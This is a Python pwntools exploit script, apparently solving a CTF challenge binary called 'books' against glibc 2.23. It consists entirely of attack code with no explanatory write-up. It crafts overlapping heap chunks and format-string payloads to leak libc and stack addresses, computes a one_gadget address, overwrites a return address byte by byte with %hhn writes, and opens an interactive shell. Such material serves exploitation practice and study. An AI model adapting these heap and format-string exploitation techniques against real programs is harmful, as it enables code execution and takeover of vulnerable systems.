from pwn import *
context(os="linux", arch="amd64")

DEBUG = 1
LOCAL = 1

def debug_on():
	context.log_level = "debug"

g_fname = "./books"
g_elf = ELF(g_fname)
g_libcname = "/glibc/2.23/64/lib/libc-2.23.so" if LOCAL else "./libc-2.23.so"
ld_name = "/glibc/2.23/64/lib/ld-2.23.so"

if (LOCAL):
	g_io = process([ld_name, g_fname])
else:
	g_io = remote()

g_libc = ELF(g_libcname)

def getpid():
	if (DEBUG & LOCAL):
		log.info("PID: %d", g_io.proc.pid)
		pause()

s, sa, sl, sla = g_io.send, g_io.sendafter, g_io.sendline, g_io.sendlineafter
r, ru, rl = g_io.recv, g_io.recvuntil, g_io.recvline

def opt(idx):
	sla("5: Submit", idx)

def ord1(content):
	opt("1")
	sla("Enter first order:", content)

def ord2(content):	
	opt("2")
	sla("Enter second order:", content)

def del1():
	opt("3")

def del2():
	opt("4")

def submit():
	opt("5")

def pwn(): 
	# 1st. overlaping ord2's chunk 
	payload_extend = flat([
		"@!@%31$p@!@%33$p@!@%2580c%13$hn".ljust(0x74, 'a').ljust(0x80, '\0'), 	# ord1's chunk
		0, 0x151, 'b'*0x80,				# ord2's chunk	
		0, 0x91, 'c'*0x80,				# dest's chunk
		0, 0x18001, 'd'*0x20,			# real top
		0, 0x21, 'e'*0x10,				# fake nextchunk
		0, 0x21,						# mark fake nextchunk inuse 
		'\n'
	])
	ord1(payload_extend)
	del2()

	# submit()
	opt(b"5".ljust(8) + p64(0x6011b8))
	
	# calc one_gadget, stack localtion
	ru("Order 2: \n")
	libc_start_main, stack_location = map(lambda x: int(x, 16), rl().split(b"@!@")[1:3])
	libc_base = libc_start_main - 240 - g_libc.symbols["__libc_start_main"]
	stack_location = stack_location - 0x1b8
	one_gadget = libc_base + 0x3f3d6 if LOCAL else 0x45216
	log.info("Received data:\n\tlibc_start_main@%#x\n\tstack@%#x\n\tlibc@%#x\n\tone_gadget@%#x", libc_start_main, stack_location, libc_base, one_gadget)

	# modify the lower 3 bytes at stack_location to one_gadget's lower 3 bytes
	off_base = 13
	fmp_tmp = "%{cnt}c%{offset}$hhn"
	prev_sent = 0
	payload = ""
	for i in range(3):
		off = off_base + i
		need_send = ((one_gadget & 0xff) - prev_sent) % 256
		prev_sent = one_gadget & 0xff
		one_gadget = one_gadget >> 8
		payload += fmp_tmp.format(cnt=need_send, offset=off)	

	payload_hijack = flat([
		payload.ljust(0x74, 'a').ljust(0x80, '\0'), 	# ord1's chunk
		0, 0x151, 'b'*0x80,				# ord2's chunk	
		0, 0x91, 'c'*0x80,				# dest's chunk
		0, 0x18001, 'd'*0x20,			# real top
		0, 0x21, 'e'*0x10,				# fake nextchunk
		0, 0x21,						# mark fake nextchunk inuse 
		'\n'
	])
	ord1(payload_hijack)
	del2()
	
	opt(flat(["55555555", stack_location, stack_location+1, stack_location+2]))

if "__main__" == __name__:
	#debug_on()
	pwn()
	g_io.interactive()
